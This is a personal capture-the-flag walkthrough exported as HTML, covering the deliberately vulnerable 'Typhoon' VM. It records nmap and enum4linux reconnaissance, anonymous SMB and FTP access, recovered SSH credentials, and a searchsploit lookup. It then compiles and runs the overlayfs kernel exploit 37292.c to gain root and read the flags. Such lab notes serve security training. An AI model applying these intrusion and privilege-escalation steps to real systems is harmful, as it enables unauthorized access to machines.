<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Typhoon</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><strong>Index</strong></p>
<p><a href="2019.html">2019</a></p>

<ol>
<li><a href="2019--BasicPenTestingBox.html">BasicPenTestingBox</a></li>
<li><a href="2019--BasicPenTestingBox2.html">BasicPenTestingBox2</a></li>
<li><a href="2019--bee_box.html">bee box</a></li>
<li><a href="2019--BossPlayer.html">BossPlayer</a></li>
<li><a href="2019--CyberChallenge19.html">CyberChallenge19</a></li>
<li><a href="2019--Dawn.html">Dawn</a></li>
<li><a href="2019--DC-1.html">DC-1</a></li>
<li><a href="2019--DC-2.html">DC-2</a></li>
<li><a href="2019--DC-3.html">DC-3</a></li>
<li><a href="2019--DerpNStik.html">DerpNStik</a></li>
<li><a href="2019--EVM.html">EVM</a></li>
<li><a href="2019--Fowsniff.html">Fowsniff</a></li>
<li><a href="2019--Gemini_Inc_1.html">Gemini Inc 1</a></li>
<li><a href="2019--JIS_CTF.html">JIS_CTF</a></li>
<li><a href="2019--mullidae.html">mullidae</a></li>
<li><a href="2019--PumpkinFestival.html">PumpkinFestival</a></li>
<li><a href="2019--PumpkinGarden.html">PumpkinGarden</a></li>
<li><a href="2019--PumpkinRaising.html">PumpkinRaising</a></li>
<li><a href="2019--QuaoarCTFHackfest2016.html">QuaoarCTFHackfest2016</a></li>
<li><a href="2019--Rickdiculously_Easy.html">Rickdiculously Easy</a></li>
<li><a href="2019--silky02.html">silky02</a></li>
<li><a href="2019--silky1.html">silky1</a></li>
<li><a href="2019--Typhoon.html">Typhoon</a></li>
<li><a href="2019--VMS_to_try.html">VMS to try</a></li>
<ol>
<li><a href="2019--VMS_to_try--US_Gov_Conf.html">US Gov Conf</a></li>
<li><a href="2019--VMS_to_try--Gruyere.html">Gruyere</a></li>
</ol>
<li><a href="2019--xss_challenges.html">xss challenges</a></li>
<li><a href="2019--Blue.html">Blue</a></li>
<li><a href="2019--mr_robot.html">mr robot</a></li>
<li><a href="2019--Unfinished_VMS.html">Unfinished VMS</a></li>
<ol>
<li><a href="2019--Unfinished_VMS--CasinoRoyale.html">CasinoRoyale</a></li>
<li><a href="2019--Unfinished_VMS--WinterMute_Straylight.html">WinterMute Straylight</a></li>
<li><a href="2019--Unfinished_VMS--connect_the_dots_(unfinished).html">connect the dots (unfinished)</a></li>
<li><a href="2019--Unfinished_VMS--arsenal.html">arsenal</a></li>
<li><a href="2019--Unfinished_VMS--heist.html">heist</a></li>
<li><a href="2019--Unfinished_VMS--MyHouse_Box.html">MyHouse Box</a></li>
<li><a href="2019--Unfinished_VMS--Sputnik.html">Sputnik</a></li>
<li><a href="2019--Unfinished_VMS--Node.html">Node</a></li>
<li><a href="2019--Unfinished_VMS--HackInOs.html">HackInOs</a></li>
<li><a href="2019--Unfinished_VMS--Seattle.html">Seattle</a></li>
<li><a href="2019--Unfinished_VMS--DC416-Galahad.html">DC416-Galahad</a></li>
</ol>
<li><a href="2019--Not_a_Box.html">Not a Box</a></li>
<ol>
<li><a href="2019--Not_a_Box--securitytreasurehunt_web.html">securitytreasurehunt web</a></li>
<li><a href="2019--Not_a_Box--rpc.html">rpc</a></li>
<li><a href="2019--Not_a_Box--msf_fix.html">msf fix</a></li>
</ol>
<li><a href="2019--ICE.html">ICE</a></li>
</ol></div>
<div class="page"><h1><b><u>Typhoon</u></b></h1>TYPHOON:<br /><br />Nmap scan report for 192.168.56.109<br />Host is up (0.00018s latency).<br />Not shown: 983 closed ports<br />PORT     STATE SERVICE<br />21/tcp   open  ftp<br />22/tcp   open  ssh<br />25/tcp   open  smtp<br />53/tcp   open  domain<br />80/tcp   open  http<br />110/tcp  open  pop3<br />111/tcp  open  rpcbind<br />139/tcp  open  netbios-ssn<br />143/tcp  open  imap<br />445/tcp  open  microsoft-ds<br />631/tcp  open  ipp<br />993/tcp  open  imaps<br />995/tcp  open  pop3s<br />2049/tcp open  nfs<br />3306/tcp open  mysql<br />5432/tcp open  postgresql<br />8080/tcp open  http-proxy<br />MAC Address: 08:00:27:1C:BE:A7 (Oracle VirtualBox virtual NIC)<br /><br />root@kali:~# nmap -sV 192.168.56.109<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-06 12:03 EST<br />Nmap scan report for 192.168.56.109<br />Host is up (0.00049s latency).<br />Not shown: 983 closed ports<br />PORT     STATE SERVICE     VERSION<br />21/tcp   open  ftp         vsftpd 3.0.2<br />22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)<br />25/tcp   open  smtp        Postfix smtpd<br />53/tcp   open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux)<br />80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))<br />110/tcp  open  pop3        Dovecot pop3d<br />111/tcp  open  rpcbind     2-4 (RPC #100000)<br />139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br />143/tcp  open  imap        Dovecot imapd (Ubuntu)<br />445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br />631/tcp  open  ipp         CUPS 1.7<br />993/tcp  open  ssl/imaps?<br />995/tcp  open  ssl/pop3s?<br />2049/tcp open  nfs_acl     2-3 (RPC #100227)<br />3306/tcp open  mysql       MySQL (unauthorized)<br />5432/tcp open  postgresql  PostgreSQL DB 9.3.3 - 9.3.5<br />8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1<br />MAC Address: 08:00:27:1C:BE:A7 (Oracle VirtualBox virtual NIC)<br />Service Info: Hosts:  typhoon, TYPHOON; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 14.79 seconds<br />root@kali:~# <br /><br /><br /><img src="images/19-1.png" alt="images/19-1.png" /><br /><br /><img src="images/19-2.png" alt="images/19-2.png" /><br /><br /><img src="images/19-3.png" alt="images/19-3.png" /><br /><br /><img src="images/19-4.png" alt="images/19-4.png" /><br /><br /><br />---&gt; is Drupal version 8<br /><br />---&gt; enumerating smb shares:<br />root@kali:~# enum4linux 192.168.56.109<br />Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Wed Nov  6 12:19:02 2019<br /><br /> ========================== <br />|    Target Information    |<br /> ========================== <br />Target ........... 192.168.56.109<br />RID Range ........ 500-550,1000-1050<br />Username ......... ''<br />Password ......... ''<br />Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br /><br /><br /> ====================================================== <br />|    Enumerating Workgroup/Domain on 192.168.56.109    |<br /> ====================================================== <br />[+] Got domain/workgroup name: WORKGROUP<br /><br /> ============================================== <br />|    Nbtstat Information for 192.168.56.109    |<br /> ============================================== <br />Looking up status of 192.168.56.109<br />	TYPHOON         &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service<br />	TYPHOON         &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service<br />	TYPHOON         &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service<br />	..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser<br />	WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name<br />	WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser<br />	WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections<br /><br />	MAC Address = 00-00-00-00-00-00<br /><br /> ======================================= <br />|    Session Check on 192.168.56.109    |<br /> ======================================= <br />[+] Server 192.168.56.109 allows sessions using username '', password ''<br /><br /> ============================================= <br />|    Getting domain SID for 192.168.56.109    |<br /> ============================================= <br />Domain Name: WORKGROUP<br />Domain Sid: (NULL SID)<br />[+] Can't determine if host is part of domain or part of a workgroup<br /><br /> ======================================== <br />|    OS information on 192.168.56.109    |<br /> ======================================== <br />Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.<br />[+] Got OS info for 192.168.56.109 from smbclient: <br />[+] Got OS info for 192.168.56.109 from srvinfo:<br />	TYPHOON        Wk Sv PrQ Unx NT SNT Samba 4.1.6-Ubuntu<br />	platform_id     :	500<br />	os version      :	4.9<br />	server type     :	0x809a03<br /><br /> =============================== <br />|    Users on 192.168.56.109    |<br /> =============================== <br />index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: typhoon	Name: typhoon	Desc: <br />index: 0x2 RID: 0x3e9 acb: 0x00000010 Account: admin	Name: 	Desc: <br /><br />user:[typhoon] rid:[0x3e8]<br />user:[admin] rid:[0x3e9]<br /><br /> =========================================== <br />|    Share Enumeration on 192.168.56.109    |<br /> =========================================== <br /><br />	Sharename       Type      Comment<br />	---------       ----      -------<br />	IPC$            IPC       IPC Service (Samba 4.1.6-Ubuntu)<br />	typhoon         Disk      typhoon<br />	print$          Disk      Printer Drivers<br />Reconnecting with SMB1 for workgroup listing.<br /><br />	Server               Comment<br />	---------            -------<br /><br />	Workgroup            Master<br />	---------            -------<br />	WORKGROUP            TYPHOON<br /><br />[+] Attempting to map shares on 192.168.56.109<br />//192.168.56.109/IPC$	[E] Can't understand response:<br />NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*<br />//192.168.56.109/typhoon	Mapping: OK, Listing: OK<br />//192.168.56.109/print$	Mapping: DENIED, Listing: N/A<br /><br /> ====================================================== <br />|    Password Policy Information for 192.168.56.109    |<br /> ====================================================== <br /><br /><br />[+] Attaching to 192.168.56.109 using a NULL share<br /><br />[+] Trying protocol 445/SMB...<br /><br />[+] Found domain(s):<br /><br />	[+] TYPHOON<br />	[+] Builtin<br /><br />[+] Password Info for Domain: TYPHOON<br /><br />	[+] Minimum password length: 5<br />	[+] Password history length: None<br />	[+] Maximum password age: 37 days 6 hours 21 minutes <br />	[+] Password Complexity Flags: 000000<br /><br />		[+] Domain Refuse Password Change: 0<br />		[+] Domain Password Store Cleartext: 0<br />		[+] Domain Password Lockout Admins: 0<br />		[+] Domain Password No Clear Change: 0<br />		[+] Domain Password No Anon Change: 0<br />		[+] Domain Password Complex: 0<br /><br />	[+] Minimum password age: None<br />	[+] Reset Account Lockout Counter: 30 minutes <br />	[+] Locked Account Duration: 30 minutes <br />	[+] Account Lockout Threshold: None<br />	[+] Forced Log off Time: 37 days 6 hours 21 minutes <br /><br /><br />[+] Retieved partial password policy with rpcclient:<br /><br />Password Complexity: Disabled<br />Minimum Password Length: 5<br /><br /><br /> ================================ <br />|    Groups on 192.168.56.109    |<br /> ================================ <br /><br />[+] Getting builtin groups:<br /><br />[+] Getting builtin group memberships:<br /><br />[+] Getting local groups:<br /><br />[+] Getting local group memberships:<br /><br />[+] Getting domain groups:<br /><br />[+] Getting domain group memberships:<br /><br /> ========================================================================= <br />|    Users on 192.168.56.109 via RID cycling (RIDS: 500-550,1000-1050)    |<br /> ========================================================================= <br />[I] Found new SID: S-1-22-1<br />[I] Found new SID: S-1-5-21-830993545-1361545238-2689178323<br />[I] Found new SID: S-1-5-32<br />[+] Enumerating users using SID S-1-22-1 and logon username '', password ''<br />S-1-22-1-1000 Unix User\typhoon (Local User)<br />S-1-22-1-1001 Unix User\admin (Local User)<br />S-1-22-1-1002 Unix User\postfixuser (Local User)<br />[+] Enumerating users using SID S-1-5-32 and logon username '', password ''<br />S-1-5-32-500 *unknown*\*unknown* (8)<br /><br />S-1-5-32-544 BUILTIN\Administrators (Local Group)<br />S-1-5-32-545 BUILTIN\Users (Local Group)<br />S-1-5-32-546 BUILTIN\Guests (Local Group)<br />S-1-5-32-547 BUILTIN\Power Users (Local Group)<br />S-1-5-32-548 BUILTIN\Account Operators (Local Group)<br />S-1-5-32-549 BUILTIN\Server Operators (Local Group)<br />S-1-5-32-550 BUILTIN\Print Operators (Local Group)<br /><br />[+] Enumerating users using SID S-1-5-21-830993545-1361545238-2689178323 and logon username '', password ''<br />S-1-5-21-830993545-1361545238-2689178323-500 *unknown*\*unknown* (8)<br />S-1-5-21-830993545-1361545238-2689178323-501 TYPHOON\nobody (Local User)<br /><br />S-1-5-21-830993545-1361545238-2689178323-513 TYPHOON\None (Domain Group)<br /><br /><br /> =============================================== <br />|    Getting printer info for 192.168.56.109    |<br /> =============================================== <br />No printers returned.<br /><br /><br />enum4linux complete on Wed Nov  6 12:19:22 2019<br /><br />-→ Share that we can access:<br />//192.168.56.109/typhoon	Mapping: OK, Listing: OK<br /><br />root@kali:~# smbclient \\\\192.168.56.109\\typhoon -N<br />Try "help" to get a list of possible commands.<br />smb: \&gt; <br /><br />There is also an Anonymous ftp:<br /><br /><img src="images/19-5.png" alt="images/19-5.png" /><br /><br />The mongodb admin page:<br /><br /><img src="images/19-6.png" alt="images/19-6.png" /><br /><br /><img src="images/19-7.png" alt="images/19-7.png" /><br /><br /><img src="images/19-8.png" alt="images/19-8.png" /><br /><br />This the credentials for the user typhoon, with password 789456123<br />Log in to ssh<br /><br /><img src="images/19-9.png" alt="images/19-9.png" /><br /><br />typhoon@typhoon:~$ lsb_release -a<br />No LSB modules are available.<br />Distributor ID:	Ubuntu<br />Description:	Ubuntu 14.04.1 LTS<br />Release:	14.04<br />Codename:	trusty<br />typhoon@typhoon:~$ <br /><br />FLAG<br />typhoon@typhoon:/typhoon$ ls<br />secret<br />typhoon@typhoon:/typhoon$ cat secret<br />test file<br />&lt;rec0nm4st3r&gt; R3c0n_m4steeeee3er_fl4g &lt;/rec0nm4st3r&gt;<br />typhoon@typhoon:/typhoon$ <br /><br />root@kali:~# searchsploit ubuntu 14.04<br />--------------------------------------------------- ----------------------------------------<br /> Exploit Title                                     |  Path<br />                                                   | (/usr/share/exploitdb/)<br />--------------------------------------------------- ----------------------------------------<br />Apport (Ubuntu 14.04/14.10/15.04) - Race Condition | exploits/linux/local/37088.c<br />Apport 2.14.1 (Ubuntu 14.04.2) - Local Privilege E | exploits/linux/local/36782.sh<br />Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/ | exploits/linux_x86-64/local/42275.c<br />Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2 | exploits/linux_x86/local/42276.c<br />Linux Kernel (Ubuntu 14.04.3) - 'perf_event_open() | exploits/linux/local/39771.txt<br />Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14. | exploits/linux/local/37292.c<br />Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14. | exploits/linux/local/37293.txt<br />Linux Kernel 3.x (Ubuntu 14.04 / Mint 17.3 / Fedor | exploits/linux/local/41999.txt<br />Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlay | exploits/linux/local/39166.c<br />Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - ' | exploits/linux_x86-64/local/40871.c<br />Linux Kernel 4.4.0-21 &lt; 4.4.0-51 (Ubuntu 14.04/16. | exploits/linux/local/47170.c<br />Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04 | exploits/linux/local/43418.c<br />Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04  | exploits/linux/local/47169.c<br />NetKit FTP Client (Ubuntu 14.04) - Crash/Denial of | exploits/linux/dos/37777.txt<br />Ubuntu 14.04/15.10 - User Namespace Overlayfs Xatt | exploits/linux/local/41762.txt<br />WebKitGTK 2.1.2 (Ubuntu 14.04) - Heap based Buffer | exploits/linux/local/44204.md<br />usb-creator 0.2.x (Ubuntu 12.04/14.04/14.10) - Loc | exploits/linux/local/36820.txt<br />--------------------------------------------------- ----------------------------------------<br />Shellcodes: No Result<br /><br /><br />root@kali:~# scp 37292.c typhoon@192.168.56.109:<br />    d888888b db    db d8888b. db   db  .d88b.   .d88b.  d8b   db <br />    `~~88~~' `8b  d8' 88  `8D 88   88 .8P  Y8. .8P  Y8. 888o  88 <br />       88     `8bd8'  88oodD' 88ooo88 88    88 88    88 88V8o 88 <br />       88       88    88~~~   88~~~88 88    88 88    88 88 V8o88 <br />       88       88    88      88   88 `8b  d8' `8b  d8' 88  V888 <br />       YP       YP    88      YP   YP  `Y88P'   `Y88P'  VP   V8P <br />                                                             <br />                 Vulnerable VM By PRISMA CSI - <a href="http://www.prismacsi.com">www.prismacsi.com</a><br /><br />WARNING:  Unauthorized access to this system is forbidden and will be<br />prosecuted by law. By accessing this system, you agree that your actions<br />may be monitored if unauthorized usage is suspected.<br /><br />		This is a joke of course :))<br />		Please hack me!<br /><br />-----------------------------------------------------------------------<br />typhoon@192.168.56.109's password: <br />37292.c                                       100% 5119     7.1MB/s   00:00    <br />root@kali:~#<br /><br />typhoon@typhoon:~$ ls<br />37292.c<br />typhoon@typhoon:~$ gcc 37292.c -o ofs<br />typhoon@typhoon:~$ .ofs<br /><br />typhoon@typhoon:~$ ./ofs<br />spawning threads<br />mount #1<br />mount #2<br />child threads done<br />/etc/ld.so.preload created<br />creating shared library<br /># <br /><br /># ls<br />37292.c  ofs<br /># id<br />uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),112(sambashare),125(libvirtd),1000(typhoon)<br /># <br /><br /># cd root<br /># ls<br />root-flag<br /># cat root-flag	<br />&lt;Congrats!&gt;<br /><br />Typhoon_r00t3r!<br /><br />&lt;/Congrats!&gt;<br /># <br /><br />Method 2: Exploiting Tomcat Manager<br />Method 3: Exploiting Drupal CMS<br />Method 4: Exploiting Lotus CMS<br /><br /><br /><br /></div></div>
</body></html>